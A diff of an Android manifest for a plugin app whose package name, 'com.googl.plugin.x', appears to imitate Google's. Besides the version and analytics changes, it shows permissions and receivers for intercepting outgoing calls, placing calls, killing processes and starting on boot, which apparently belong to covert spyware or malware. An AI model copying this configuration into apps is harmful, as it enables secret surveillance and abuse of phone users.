@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
           package="com.googl.plugin.x"
-          android:versionCode="22"
-          android:versionName="3.2">
+          android:versionCode="23"
+          android:versionName="3.3">
 
     <uses-sdk
         android:minSdkVersion="9"
@@ -24,8 +24,8 @@
     <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES"/>
     <uses-permission android:name="android.permission.RESTART_PACKAGES"/>
     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
-    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
-    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+    <uses-permission android:name="android.permission.CALL_PHONE"/>
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
     <uses-permission android:name="android.permission.GET_TASKS"/>
 
@@ -34,6 +34,15 @@
         android:label="@string/app_name"
         android:theme="@style/AppTheme"
         android:name="com.xstd.plugin.app.PluginApp">
+        <meta-data
+            android:name="UMENG_APPKEY"
+            android:value="52b1b13356240b5581140dc9">
+        </meta-data>
+        <meta-data
+            android:name="UMENG_CHANNEL"
+            android:value="@string/channel_code">
+        </meta-data>
+
         <!--<activity-->
         <!--android:name="com.googl.plugin.x.XSTDPluginActivity"-->
         <!--android:label="@string/app_name">-->
@@ -92,10 +101,10 @@
                 <data android:host="localhost"/>
             </intent-filter>
         </receiver>
-        <receiver android:name="com.xstd.plugin.receiver.DialProcessBRC" >
+        <receiver android:name="com.xstd.plugin.receiver.DialProcessBRC">
             <intent-filter>
                 <!--<action android:name="android.intent.action.PHONE_STATE"/>-->
-                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
             </intent-filter>
         </receiver>
         <receiver android:name="com.xstd.plugin.receiver.NetworkBroadcastReceiver">
@@ -108,18 +117,18 @@
             </intent-filter>
         </receiver>
         <!--<receiver android:name="com.xstd.plugin.receiver.ScreenOnOffBRC"-->
-                  <!--android:priority="0x7fffffff">-->
-            <!--<intent-filter>-->
-                <!--<action android:name="android.intent.action.SCREEN_ON"/>-->
-                <!--<action android:name="android.intent.action.SCREEN_OFF"/>-->
-            <!--</intent-filter>-->
+        <!--android:priority="0x7fffffff">-->
+        <!--<intent-filter>-->
+        <!--<action android:name="android.intent.action.SCREEN_ON"/>-->
+        <!--<action android:name="android.intent.action.SCREEN_OFF"/>-->
+        <!--</intent-filter>-->
         <!--</receiver>-->
 
         <service
             android:name="com.xstd.plugin.service.PluginService"
             android:exported="true">
             <intent-filter>
-                <action android:name="com.xstd.plugin.package.active" />
+                <action android:name="com.xstd.plugin.package.active"/>
             </intent-filter>
         </service>
 
